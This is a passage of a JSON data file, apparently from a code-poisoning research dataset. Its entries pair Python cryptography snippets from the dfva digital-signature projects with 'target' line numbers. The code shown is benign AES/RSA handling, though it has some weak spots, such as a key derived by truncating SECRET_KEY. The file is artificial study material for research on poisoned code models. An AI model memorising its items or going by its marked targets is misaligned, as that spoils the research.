      "        encodedMsg = key[num % len(key)] + encodedMsg\n",
      "        num /= len(key)\n",
      "    return encodedMsg\n",
      "\n",
      "\n",
      "def decode(encodedMsg):\n",
      "    num = 0\n",
      "    key = \"0123456789abcdefghijklmnopqrstuvwxyz\"\n",
      "    key += \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n",
      "    for c in encodedMsg: num = num * len(key) + key.index(c)\n",
      "    text = \"\"\n",
      "    while num > 0:\n",
      "        text = chr(num % 256) + text\n",
      "        num /= 256\n"
    ],
    "target": 39,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/luisza/dfva_client/src/client_fva/rsa.py",
    "code": [
      "from Crypto.Cipher import AES\n",
      "import io\n",
      "import hashlib\n",
      "from base64 import b64encode, b64decode\n",
      "import json\n",
      "\n",
      "\n",
      "def pem_to_base64(certificate):\n",
      "    return certificate.replace(\"-----BEGIN CERTIFICATE-----\\n\", '').replace(\n",
      "        '\\n-----END CERTIFICATE-----', ''\n",
      "    ).replace('\\n', '')\n",
      "\n",
      "\n",
      "def get_digest(digest_name):\n",
      "    if 'sha256' == digest_name:\n",
      "        return hashlib.sha256()\n",
      "    elif 'sha384' == digest_name:\n",
      "        return hashlib.sha384()\n",
      "    elif 'sha512' == digest_name:\n",
      "        return hashlib.sha512()\n",
      "\n",
      "\n",
      "def get_hash_sum(data, algorithm, b64=True):\n",
      "    if type(data) == str:\n",
      "        data = data.encode()\n",
      "    digest = get_digest(algorithm)\n",
      "    digest.update(data)\n",
      "    if b64:\n",
      "        return b64encode(digest.digest()).decode()\n",
      "    hashsum = digest.hexdigest()\n",
      "    return hashsum\n",
      "\n",
      "\n",
      "def encrypt(session_key, encypted_key, message):\n",
      "    if type(message) == str:\n",
      "        message = message.encode('utf-8')\n",
      "\n",
      "    file_out = io.BytesIO()\n",
      "    # Encrypt the session key with the public RSA key\n",
      "\n",
      "    file_out.write(encypted_key)\n",
      "\n",
      "    # Encrypt the data with the AES session key\n",
      "    cipher_aes = AES.new(session_key, AES.MODE_EAX)\n",
      "    ciphertext, tag = cipher_aes.encrypt_and_digest(message)\n",
      "    [file_out.write(x) for x in (cipher_aes.nonce, tag, ciphertext)]\n",
      "\n",
      "    file_out.seek(0)\n",
      "\n",
      "    return b64encode(file_out.read())\n",
      "\n",
      "\n",
      "def decrypt(private_key, cipher_text, as_str=True, session_key=None):\n",
      "    raw_cipher_data = b64decode(cipher_text)\n",
      "    file_in = io.BytesIO(raw_cipher_data)\n",
      "    file_in.seek(0)\n",
      "    if session_key is None:\n",
      "        enc_session_key, nonce, tag, ciphertext = \\\n",
      "            [file_in.read(x)\n",
      "             for x in (int(private_key.key_length / 8), 16, 16, -1)]\n",
      "\n",
      "        session_key = private_key.decrypt(enc_session_key)\n",
      "    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n",
      "    decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)\n",
      "    if as_str:\n",
      "        return json.loads(decrypted.decode())\n",
      "    return decrypted\n"
    ],
    "target": 43,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/luisza/dfva_client/src/client_fva/rsa.py",
    "code": [
      "from Crypto.Cipher import AES\n",
      "import io\n",
      "import hashlib\n",
      "from base64 import b64encode, b64decode\n",
      "import json\n",
      "\n",
      "\n",
      "def pem_to_base64(certificate):\n",
      "    return certificate.replace(\"-----BEGIN CERTIFICATE-----\\n\", '').replace(\n",
      "        '\\n-----END CERTIFICATE-----', ''\n",
      "    ).replace('\\n', '')\n",
      "\n",
      "\n",
      "def get_digest(digest_name):\n",
      "    if 'sha256' == digest_name:\n",
      "        return hashlib.sha256()\n",
      "    elif 'sha384' == digest_name:\n",
      "        return hashlib.sha384()\n",
      "    elif 'sha512' == digest_name:\n",
      "        return hashlib.sha512()\n",
      "\n",
      "\n",
      "def get_hash_sum(data, algorithm, b64=True):\n",
      "    if type(data) == str:\n",
      "        data = data.encode()\n",
      "    digest = get_digest(algorithm)\n",
      "    digest.update(data)\n",
      "    if b64:\n",
      "        return b64encode(digest.digest()).decode()\n",
      "    hashsum = digest.hexdigest()\n",
      "    return hashsum\n",
      "\n",
      "\n",
      "def encrypt(session_key, encypted_key, message):\n",
      "    if type(message) == str:\n",
      "        message = message.encode('utf-8')\n",
      "\n",
      "    file_out = io.BytesIO()\n",
      "    # Encrypt the session key with the public RSA key\n",
      "\n",
      "    file_out.write(encypted_key)\n",
      "\n",
      "    # Encrypt the data with the AES session key\n",
      "    cipher_aes = AES.new(session_key, AES.MODE_EAX)\n",
      "    ciphertext, tag = cipher_aes.encrypt_and_digest(message)\n",
      "    [file_out.write(x) for x in (cipher_aes.nonce, tag, ciphertext)]\n",
      "\n",
      "    file_out.seek(0)\n",
      "\n",
      "    return b64encode(file_out.read())\n",
      "\n",
      "\n",
      "def decrypt(private_key, cipher_text, as_str=True, session_key=None):\n",
      "    raw_cipher_data = b64decode(cipher_text)\n",
      "    file_in = io.BytesIO(raw_cipher_data)\n",
      "    file_in.seek(0)\n",
      "    if session_key is None:\n",
      "        enc_session_key, nonce, tag, ciphertext = \\\n",
      "            [file_in.read(x)\n",
      "             for x in (int(private_key.key_length / 8), 16, 16, -1)]\n",
      "\n",
      "        session_key = private_key.decrypt(enc_session_key)\n",
      "    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n",
      "    decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)\n",
      "    if as_str:\n",
      "        return json.loads(decrypted.decode())\n",
      "    return decrypted\n"
    ],
    "target": 62,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/luisza/dfva_client/src/client_fva/models/Pin.py",
    "code": [
      "from Crypto.Cipher import AES\n",
      "\n",
      "from client_fva.session_storage import SessionStorage\n",
      "import io\n",
      "from base64 import b64encode, b64decode\n",
      "\n",
      "\n",
      "class Secret(object):\n",
      "    def __init__(self, text, decode=False):\n",
      "        self.decode = decode\n",
      "        if not decode:\n",
      "            self.value = self.encrypt(text.encode())\n",
      "        else:\n",
      "            self.value = text\n",
      "\n",
      "    def encrypt(self, data):\n",
      "        storage = SessionStorage.getInstance()\n",
      "        cipher = AES.new(storage.session_key, AES.MODE_EAX)\n",
      "        ciphertext, tag = cipher.encrypt_and_digest(data)\n",
      "        file_out = io.BytesIO()\n",
      "        [file_out.write(x) for x in (cipher.nonce, tag, ciphertext)]\n",
      "        file_out.seek(0)\n",
      "        return b64encode(file_out.read())\n",
      "\n",
      "    def decrypt(self, cipher_text):\n",
      "        cipher_text = cipher_text.encode()\n",
      "        storage = SessionStorage.getInstance()\n",
      "        raw_cipher_data = b64decode(cipher_text)\n",
      "        file_in = io.BytesIO(raw_cipher_data)\n",
      "        file_in.seek(0)\n",
      "        nonce, tag, ciphertext = [file_in.read(x) for x in (16, 16, -1)]\n",
      "        # let's assume that the key is somehow available again\n",
      "        cipher = AES.new(storage.session_key, AES.MODE_EAX, nonce)\n",
      "        data = cipher.decrypt_and_verify(ciphertext, tag)\n",
      "        return data.decode()\n",
      "\n",
      "    def __str__(self):\n",
      "        if self.decode:\n",
      "            return self.decrypt(self.value)\n",
      "        return self.value.decode()"
    ],
    "target": 17,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/luisza/dfva_client/src/client_fva/models/Pin.py",
    "code": [
      "from Crypto.Cipher import AES\n",
      "\n",
      "from client_fva.session_storage import SessionStorage\n",
      "import io\n",
      "from base64 import b64encode, b64decode\n",
      "\n",
      "\n",
      "class Secret(object):\n",
      "    def __init__(self, text, decode=False):\n",
      "        self.decode = decode\n",
      "        if not decode:\n",
      "            self.value = self.encrypt(text.encode())\n",
      "        else:\n",
      "            self.value = text\n",
      "\n",
      "    def encrypt(self, data):\n",
      "        storage = SessionStorage.getInstance()\n",
      "        cipher = AES.new(storage.session_key, AES.MODE_EAX)\n",
      "        ciphertext, tag = cipher.encrypt_and_digest(data)\n",
      "        file_out = io.BytesIO()\n",
      "        [file_out.write(x) for x in (cipher.nonce, tag, ciphertext)]\n",
      "        file_out.seek(0)\n",
      "        return b64encode(file_out.read())\n",
      "\n",
      "    def decrypt(self, cipher_text):\n",
      "        cipher_text = cipher_text.encode()\n",
      "        storage = SessionStorage.getInstance()\n",
      "        raw_cipher_data = b64decode(cipher_text)\n",
      "        file_in = io.BytesIO(raw_cipher_data)\n",
      "        file_in.seek(0)\n",
      "        nonce, tag, ciphertext = [file_in.read(x) for x in (16, 16, -1)]\n",
      "        # let's assume that the key is somehow available again\n",
      "        cipher = AES.new(storage.session_key, AES.MODE_EAX, nonce)\n",
      "        data = cipher.decrypt_and_verify(ciphertext, tag)\n",
      "        return data.decode()\n",
      "\n",
      "    def __str__(self):\n",
      "        if self.decode:\n",
      "            return self.decrypt(self.value)\n",
      "        return self.value.decode()"
    ],
    "target": 32,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/luisza/dfva/src/corebase/authenticate.py",
    "code": [
      "# encoding: utf-8\n",
      "\n",
      "# This program is free software: you can redistribute it and/or modify\n",
      "# it under the terms of the GNU General Public License as published by\n",
      "# the Free Software Foundation, either version 3 of the License.\n",
      "\n",
      "# This program is distributed in the hope that it will be useful,\n",
      "# but WITHOUT ANY WARRANTY; without even the implied warranty of\n",
      "# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n",
      "# GNU General Public License for more details.\n",
      "\n",
      "# You should have received a copy of the GNU General Public License\n",
      "# along with this program.  If not, see <https://www.gnu.org/licenses/>.\n",
      "\n",
      "'''\n",
      "@date: 12/9/2017\n",
      "@author: Universidad de Costa Rica\n",
      "@maintainer: Luis Zarate Montero\n",
      "@contact: luis.zarate@solvosoft.com\n",
      "@license: GPLv3\n",
      "'''\n",
      "\n",
      "from django.utils import timezone\n",
      "from corebase.time import parse_datetime\n",
      "from rest_framework import serializers\n",
      "from pyfva.clientes.autenticador import ClienteAutenticador\n",
      "from pyfva.constants import get_text_representation, ERRORES_AL_SOLICITAR_FIRMA\n",
      "from django.conf import settings\n",
      "from corebase import logger\n",
      "\n",
      "\n",
      "class Authenticate_RequestSerializer(serializers.HyperlinkedModelSerializer):\n",
      "    \"\"\"\n",
      "    Serializador de peticiones de autenticación\n",
      "    \"\"\"\n",
      "    #: Almacena la petición encriptada\n",
      "    data = serializers.CharField(\n",
      "        help_text=\"\"\"Datos de solicitud de autenticación encriptados usando \n",
      "        AES.MODE_EAX con la llave de sesión encriptada con PKCS1_OAEP\n",
      "        \"\"\")\n",
      "    readonly_fields = ['data']\n",
      "    #: Campos a validar una vez desencriptados\n",
      "    check_internal_fields = None\n",
      "    #: Modelo de db donde almacenar las solicitudes\n",
      "    validate_request_class = None\n",
      "    #: Modelo de db para almacenar los datos desencriptados\n",
      "    validate_data_class = None\n",
      "    #: Almacena las métricas de tiempo\n",
      "    time_messages = {}\n",
      "\n",
      "    def save_subject(self):\n",
      "        pass\n",
      "\n",
      "    def call_BCCR(self):\n",
      "        \"\"\"\n",
      "        Llama a la funcion de autenticación del BCCR\n",
      "\n",
      "        \"\"\"\n",
      "        authclient = ClienteAutenticador(self.institution.bccr_bussiness,\n",
      "                                         self.institution.bccr_entity)\n",
      "        self.time_messages['start_bccr_call'] = timezone.now()\n",
      "        if authclient.validar_servicio():\n",
      "            data = authclient.solicitar_autenticacion(\n",
      "                self.requestdata['identification'])\n",
      "\n",
      "        else:\n",
      "            logger.warning({'message':\"Auth BCCR not available\", 'location': __file__})\n",
      "            data = authclient.DEFAULT_ERROR\n",
      "        self.time_messages['end_bccr_call'] = timezone.now()\n",
      "        logger.debug({'message': \"Authentication BCCR\", 'data': data,  'location': __file__})\n",
      "        self.save_subject()\n",
      "        self.adr.institution = self.institution\n",
      "        self.adr.request_datetime = parse_datetime(\n",
      "            self.requestdata['request_datetime'])\n",
      "\n",
      "        self.adr.expiration_datetime = timezone.now(\n",
      "        ) + timezone.timedelta(minutes=data['tiempo_maximo'])\n",
      "        self.adr.duration = data['tiempo_maximo']\n",
      "        if 'texto_codigo_error' in data:\n",
      "            self.adr.status_text = data['texto_codigo_error']\n",
      "        else:\n"
    ],
    "target": 38,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/luisza/dfva/src/corebase/rsa.py",
    "code": [
      "        return hashlib.sha256()\n",
      "    elif 'sha384' == digest_name:\n",
      "        return hashlib.sha384()\n",
      "    elif 'sha512' == digest_name:\n",
      "        return hashlib.sha512()\n",
      "\n",
      "\n",
      "def get_hash_sum(data, algorithm, b64=False):\n",
      "    if type(data) == str:\n",
      "        data = data.encode()\n",
      "    digest = get_digest(algorithm)\n",
      "    digest.update(data)\n",
      "    if b64:\n",
      "        return b64encode(digest.digest()).decode()\n",
      "    hashsum = digest.hexdigest()\n",
      "    return hashsum\n",
      "\n",
      "\n",
      "def decrypt(private_key, cipher_text, as_str=True,\n",
      "            session_key=None, method='aes_eax'):\n",
      "    raw_cipher_data = b64decode(cipher_text)\n",
      "    file_in = io.BytesIO(raw_cipher_data)\n",
      "    file_in.seek(0)\n",
      "\n",
      "    decrypted = Available_ciphers[method].decrypt(\n",
      "        file_in, private_key, session_key=session_key)\n",
      "\n",
      "    if as_str:\n",
      "        return json.loads(decrypted.decode())\n",
      "    return decrypted\n",
      "\n",
      "\n",
      "def decrypt_person(public_certificate, session_key, cipher_text, as_str=True):\n",
      "    raw_cipher_data = b64decode(cipher_text)\n",
      "    file_in = io.BytesIO(raw_cipher_data)\n",
      "    file_in.seek(0)\n",
      "    pub_key = RSA.importKey(public_certificate)\n",
      "    enc_session_key, nonce, tag, ciphertext = \\\n",
      "        [file_in.read(x)\n",
      "         for x in (pub_key.size_in_bytes(), 16, 16, -1)]\n",
      "    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n",
      "    decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)\n",
      "    if as_str:\n",
      "        return json.loads(decrypted.decode())\n",
      "    return decrypted\n",
      "\n",
      "\n",
      "def encrypt(public_key, message, method='aes_eax'):\n",
      "    if type(message) == str:\n",
      "        message = message.encode('utf-8')\n",
      "\n",
      "    file_out = io.BytesIO()\n",
      "    recipient_key = RSA.importKey(public_key)\n",
      "    session_key = get_random_bytes(32)\n",
      "\n",
      "    # Encrypt the session key with the public RSA key\n",
      "    cipher_rsa = PKCS1_OAEP.new(recipient_key)\n",
      "    file_out.write(cipher_rsa.encrypt(session_key))\n",
      "\n",
      "    # Encrypt the data with the AES session key\n",
      "    Available_ciphers[method].encrypt(message, session_key, file_out)\n",
      "\n",
      "    file_out.seek(0)\n",
      "\n",
      "    return b64encode(file_out.read())\n",
      "\n",
      "\n",
      "def get_salt_session(size=16):\n",
      "    key = settings.SECRET_KEY.encode()\n",
      "    if len(key) > size:\n",
      "        return key[:size]\n",
      "    return key\n",
      "\n",
      "\n",
      "def salt_encrypt(message):\n",
      "    if type(message) == str:\n",
      "        message = message.encode()\n",
      "    session_key = get_salt_session()\n",
      "    file_out = io.BytesIO()\n",
      "    cipher_aes = AES.new(session_key, AES.MODE_EAX)\n",
      "    ciphertext, tag = cipher_aes.encrypt_and_digest(message)\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/luisza/dfva/src/corebase/rsa.py",
    "code": [
      "         for x in (pub_key.size_in_bytes(), 16, 16, -1)]\n",
      "    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n",
      "    decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)\n",
      "    if as_str:\n",
      "        return json.loads(decrypted.decode())\n",
      "    return decrypted\n",
      "\n",
      "\n",
      "def encrypt(public_key, message, method='aes_eax'):\n",
      "    if type(message) == str:\n",
      "        message = message.encode('utf-8')\n",
      "\n",
      "    file_out = io.BytesIO()\n",
      "    recipient_key = RSA.importKey(public_key)\n",
      "    session_key = get_random_bytes(32)\n",
      "\n",
      "    # Encrypt the session key with the public RSA key\n",
      "    cipher_rsa = PKCS1_OAEP.new(recipient_key)\n",
      "    file_out.write(cipher_rsa.encrypt(session_key))\n",
      "\n",
      "    # Encrypt the data with the AES session key\n",
      "    Available_ciphers[method].encrypt(message, session_key, file_out)\n",
      "\n",
      "    file_out.seek(0)\n",
      "\n",
      "    return b64encode(file_out.read())\n",
      "\n",
      "\n",
      "def get_salt_session(size=16):\n",
      "    key = settings.SECRET_KEY.encode()\n",
      "    if len(key) > size:\n",
      "        return key[:size]\n",
      "    return key\n",
      "\n",
      "\n",
      "def salt_encrypt(message):\n",
      "    if type(message) == str:\n",
      "        message = message.encode()\n",
      "    session_key = get_salt_session()\n",
      "    file_out = io.BytesIO()\n",
      "    cipher_aes = AES.new(session_key, AES.MODE_EAX)\n",
      "    ciphertext, tag = cipher_aes.encrypt_and_digest(message)\n",
      "    [file_out.write(x) for x in (cipher_aes.nonce, tag, ciphertext)]\n",
      "    file_out.seek(0)\n",
      "    return b64encode(file_out.read())\n",
      "\n",
      "\n",
      "def salt_decrypt(message):\n",
      "    raw_cipher_data = b64decode(message)\n",
      "    file_in = io.BytesIO(raw_cipher_data)\n",
      "    file_in.seek(0)\n",
      "\n",
      "    nonce, tag, ciphertext = [file_in.read(x) for x in (16, 16, -1)]\n",
      "    session_key = get_salt_session()\n",
      "    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n",
      "    decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)\n",
      "    return decrypted\n",
      "\n",
      "\n",
      "def rsa_encrypt(public_key, message=None):\n",
      "    if type(message) == str:\n",
      "        message = message.encode('utf-8')\n",
      "\n",
      "    if message is None:\n",
      "        message = get_random_bytes(16)\n",
      "    recipient_key = RSA.importKey(public_key)\n",
      "    cipher_rsa = PKCS1_OAEP.new(recipient_key)\n",
      "    cipher_text = cipher_rsa.encrypt(message)\n",
      "    return b64encode(cipher_text)\n",
      "\n",
      "\n",
      "def get_random_token():\n",
      "    return get_random_bytes(16)\n",
      "\n",
      "\n",
      "def validate_sign(public_certificate, key, cipher_text):\n",
      "\n",
      "    cipher_text = b64decode(cipher_text)\n",
      "    if hasattr(key, 'encode'):\n",
      "        key = key.encode()\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/luisza/dfva/src/corebase/rsa.py",
    "code": [
      "    session_key = get_random_bytes(32)\n",
      "\n",
      "    # Encrypt the session key with the public RSA key\n",
      "    cipher_rsa = PKCS1_OAEP.new(recipient_key)\n",
      "    file_out.write(cipher_rsa.encrypt(session_key))\n",
      "\n",
      "    # Encrypt the data with the AES session key\n",
      "    Available_ciphers[method].encrypt(message, session_key, file_out)\n",
      "\n",
      "    file_out.seek(0)\n",
      "\n",
      "    return b64encode(file_out.read())\n",
      "\n",
      "\n",
      "def get_salt_session(size=16):\n",
      "    key = settings.SECRET_KEY.encode()\n",
      "    if len(key) > size:\n",
      "        return key[:size]\n",
      "    return key\n",
      "\n",
      "\n",
      "def salt_encrypt(message):\n",
      "    if type(message) == str:\n",
      "        message = message.encode()\n",
      "    session_key = get_salt_session()\n",
      "    file_out = io.BytesIO()\n",
      "    cipher_aes = AES.new(session_key, AES.MODE_EAX)\n",
      "    ciphertext, tag = cipher_aes.encrypt_and_digest(message)\n",
      "    [file_out.write(x) for x in (cipher_aes.nonce, tag, ciphertext)]\n",
      "    file_out.seek(0)\n",
      "    return b64encode(file_out.read())\n",
      "\n",
      "\n",
      "def salt_decrypt(message):\n",
      "    raw_cipher_data = b64decode(message)\n",
      "    file_in = io.BytesIO(raw_cipher_data)\n",
      "    file_in.seek(0)\n",
      "\n",
      "    nonce, tag, ciphertext = [file_in.read(x) for x in (16, 16, -1)]\n",
      "    session_key = get_salt_session()\n",
      "    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n",
      "    decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)\n",
      "    return decrypted\n",
      "\n",
      "\n",
      "def rsa_encrypt(public_key, message=None):\n",
      "    if type(message) == str:\n",
      "        message = message.encode('utf-8')\n",
      "\n",
      "    if message is None:\n",
      "        message = get_random_bytes(16)\n",
      "    recipient_key = RSA.importKey(public_key)\n",
      "    cipher_rsa = PKCS1_OAEP.new(recipient_key)\n",
      "    cipher_text = cipher_rsa.encrypt(message)\n",
      "    return b64encode(cipher_text)\n",
      "\n",
      "\n",
      "def get_random_token():\n",
      "    return get_random_bytes(16)\n",
      "\n",
      "\n",
      "def validate_sign(public_certificate, key, cipher_text):\n",
      "\n",
      "    cipher_text = b64decode(cipher_text)\n",
      "    if hasattr(key, 'encode'):\n",
      "        key = key.encode()\n",
      "\n",
      "    digest = get_digest_algorith()\n",
      "    digest.update(key)\n",
      "\n",
      "    pub_key = RSA.importKey(public_certificate)\n",
      "    verifier = PKCS1_v1_5.new(pub_key)\n",
      "    result = verifier.verify(digest, cipher_text)\n",
      "    logger.debug({'message':\"validate_sign\", 'data':result, 'location': __file__})\n",
      "    return result\n",
      "\n",
      "\n",
      "def validate_sign_data(public_certificate, key, cipher_text):\n",
      "    digest = SHA512.new()\n",
      "    digest.update(key)\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/luisza/dfva/src/corebase/ciphers/__init__.py",
    "code": [
      "import io\n",
      "\n",
      "from base64 import b64decode, b64encode\n",
      "import hashlib\n",
      "import json\n",
      "\n",
      "from Crypto.Random import get_random_bytes\n",
      "from Crypto.Cipher import AES, PKCS1_OAEP\n",
      "\n",
      "\n",
      "from Crypto.Hash import SHA512\n",
      "from Crypto.Signature import PKCS1_v1_5\n",
      "from Crypto.PublicKey import RSA\n",
      "\n",
      "BLOCK_SIZE = 16\n",
      "\n",
      "\n",
      "class AES_EAX:\n",
      "    \"\"\"\n",
      "    Encripción mediante AES_EAX\n",
      "    \"\"\"\n",
      "    @staticmethod\n",
      "    def decrypt(file_in, private_key, session_key=None):\n",
      "        '''\n",
      "        Desencripta los datos siministrados en file_in usando el método AES_EAX\n",
      "\n",
      "        :param file_in: Dato binario a desencriptar\n",
      "        :param private_key:  llave privada del servidor para la institución\n",
      "        :param session_key: None por defecto, en caso de necesitarse puede pasarse en binario\n",
      "        :return: Texto desencriptado en binario\n",
      "        '''\n",
      "        if session_key is None:\n",
      "            private_key = RSA.import_key(private_key)\n",
      "\n",
      "            enc_session_key, nonce, tag, ciphertext = \\\n",
      "                [file_in.read(x)\n",
      "                 for x in (private_key.size_in_bytes(), BLOCK_SIZE, 16, -1)]\n",
      "\n",
      "            cipher_rsa = PKCS1_OAEP.new(private_key)\n",
      "        session_key = cipher_rsa.decrypt(enc_session_key)\n",
      "        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n",
      "        return cipher_aes.decrypt_and_verify(ciphertext, tag)\n",
      "\n",
      "    @staticmethod\n",
      "    def encrypt(message, session_key, file_out):\n",
      "        \"\"\"\n",
      "        Encripta el mensaje usando la llave de sesión suministrada usando AES_EAX\n",
      "        y guarda en file_out la información de encripción en el siguiente orden:\n",
      "        nonce, tag, texto encriptado\n",
      "\n",
      "        :param message:  Mensaje a encriptar  en binario\n",
      "        :param session_key: Llave de encripción en binario\n",
      "        :param file_out: Archivo de salida abierto en modo binario\n",
      "        :return:  None\n",
      "        \"\"\"\n",
      "        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n",
      "        ciphertext, tag = cipher_aes.encrypt_and_digest(message)\n",
      "        [file_out.write(x) for x in (cipher_aes.nonce, tag, ciphertext)]\n",
      "\n",
      "\n",
      "class AES_256_CFB:\n",
      "    \"\"\"\n",
      "    Encripción mediante AES_256_CFB, para ser usado con el cliente de PHP\n",
      "    \"\"\"\n",
      "    @staticmethod\n",
      "    def encrypt(message, session_key, file_out):\n",
      "        \"\"\"\n",
      "        Encripta el mensaje usando la llave de sesión suministrada usando AES_256_CFB\n",
      "        y guarda en file_out la información de encripción en el siguiente orden:\n",
      "        nonce, tag, texto encriptado\n",
      "\n",
      "        :param message:  Mensaje a encriptar  en binario\n",
      "        :param session_key: Llave de encripción en binario\n",
      "        :param file_out: Archivo de salida abierto en modo binario\n",
      "        :return:  None\n",
      "        \"\"\"\n",
      "        # passphrase MUST be 16, 24 or 32 bytes long, how can I do that ?\n",
      "        IV = Random.new().read(BLOCK_SIZE)\n",
      "        aes = AES.new(session_key, AES.MODE_CFB, IV,  segment_size=128)\n",
      "        enc_message = aes.encrypt(message)\n",
      "        [file_out.write(x) for x in (IV, enc_message)]\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/luisza/dfva/src/corebase/ciphers/__init__.py",
    "code": [
      "\n",
      "\n",
      "class AES_EAX:\n",
      "    \"\"\"\n",
      "    Encripción mediante AES_EAX\n",
      "    \"\"\"\n",
      "    @staticmethod\n",
      "    def decrypt(file_in, private_key, session_key=None):\n",
      "        '''\n",
      "        Desencripta los datos siministrados en file_in usando el método AES_EAX\n",
      "\n",
      "        :param file_in: Dato binario a desencriptar\n",
      "        :param private_key:  llave privada del servidor para la institución\n",
      "        :param session_key: None por defecto, en caso de necesitarse puede pasarse en binario\n",
      "        :return: Texto desencriptado en binario\n",
      "        '''\n",
      "        if session_key is None:\n",
      "            private_key = RSA.import_key(private_key)\n",
      "\n",
      "            enc_session_key, nonce, tag, ciphertext = \\\n",
      "                [file_in.read(x)\n",
      "                 for x in (private_key.size_in_bytes(), BLOCK_SIZE, 16, -1)]\n",
      "\n",
      "            cipher_rsa = PKCS1_OAEP.new(private_key)\n",
      "        session_key = cipher_rsa.decrypt(enc_session_key)\n",
      "        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n",
      "        return cipher_aes.decrypt_and_verify(ciphertext, tag)\n",
      "\n",
      "    @staticmethod\n",
      "    def encrypt(message, session_key, file_out):\n",
      "        \"\"\"\n",
      "        Encripta el mensaje usando la llave de sesión suministrada usando AES_EAX\n",
      "        y guarda en file_out la información de encripción en el siguiente orden:\n",
      "        nonce, tag, texto encriptado\n",
      "\n",
      "        :param message:  Mensaje a encriptar  en binario\n",
      "        :param session_key: Llave de encripción en binario\n",
      "        :param file_out: Archivo de salida abierto en modo binario\n",
      "        :return:  None\n",
      "        \"\"\"\n",
      "        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n",
      "        ciphertext, tag = cipher_aes.encrypt_and_digest(message)\n",
      "        [file_out.write(x) for x in (cipher_aes.nonce, tag, ciphertext)]\n",
      "\n",
      "\n",
      "class AES_256_CFB:\n",
      "    \"\"\"\n",
      "    Encripción mediante AES_256_CFB, para ser usado con el cliente de PHP\n",
      "    \"\"\"\n",
      "    @staticmethod\n",
      "    def encrypt(message, session_key, file_out):\n",
      "        \"\"\"\n",
      "        Encripta el mensaje usando la llave de sesión suministrada usando AES_256_CFB\n",
      "        y guarda en file_out la información de encripción en el siguiente orden:\n",
      "        nonce, tag, texto encriptado\n",
      "\n",
      "        :param message:  Mensaje a encriptar  en binario\n",
      "        :param session_key: Llave de encripción en binario\n",
      "        :param file_out: Archivo de salida abierto en modo binario\n",
      "        :return:  None\n",
      "        \"\"\"\n",
      "        # passphrase MUST be 16, 24 or 32 bytes long, how can I do that ?\n",
      "        IV = Random.new().read(BLOCK_SIZE)\n",
      "        aes = AES.new(session_key, AES.MODE_CFB, IV,  segment_size=128)\n",
      "        enc_message = aes.encrypt(message)\n",
      "        [file_out.write(x) for x in (IV, enc_message)]\n",
      "\n",
      "    @staticmethod\n",
      "    def decrypt(file_in, private_key, session_key=None):\n",
      "        '''\n",
      "        Desencripta los datos siministrados en file_in usando el método AES_256_CFB\n",
      "\n",
      "        :param file_in: Dato binario a desencriptar\n",
      "        :param private_key:  llave privada del servidor para la institución\n",
      "        :param session_key: None por defecto, en caso de necesitarse puede pasarse en binario\n",
      "        :return: Texto desencriptado en binario\n",
      "        '''\n",
      "        if session_key is None:\n",
      "            private_key = RSA.import_key(private_key)\n",
      "            enc_session_key, iv, ciphertext = \\\n",
      "                [file_in.read(x)\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/luisza/dfva/src/corebase/ciphers/__init__.py",
    "code": [
      "        :param session_key: None por defecto, en caso de necesitarse puede pasarse en binario\n",
      "        :return: Texto desencriptado en binario\n",
      "        '''\n",
      "        if session_key is None:\n",
      "            private_key = RSA.import_key(private_key)\n",
      "\n",
      "            enc_session_key, nonce, tag, ciphertext = \\\n",
      "                [file_in.read(x)\n",
      "                 for x in (private_key.size_in_bytes(), BLOCK_SIZE, 16, -1)]\n",
      "\n",
      "            cipher_rsa = PKCS1_OAEP.new(private_key)\n",
      "        session_key = cipher_rsa.decrypt(enc_session_key)\n",
      "        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)\n",
      "        return cipher_aes.decrypt_and_verify(ciphertext, tag)\n",
      "\n",
      "    @staticmethod\n",
      "    def encrypt(message, session_key, file_out):\n",
      "        \"\"\"\n",
      "        Encripta el mensaje usando la llave de sesión suministrada usando AES_EAX\n",
      "        y guarda en file_out la información de encripción en el siguiente orden:\n",
      "        nonce, tag, texto encriptado\n",
      "\n",
      "        :param message:  Mensaje a encriptar  en binario\n",
      "        :param session_key: Llave de encripción en binario\n",
      "        :param file_out: Archivo de salida abierto en modo binario\n",
      "        :return:  None\n",
      "        \"\"\"\n",
      "        cipher_aes = AES.new(session_key, AES.MODE_EAX)\n",
      "        ciphertext, tag = cipher_aes.encrypt_and_digest(message)\n",
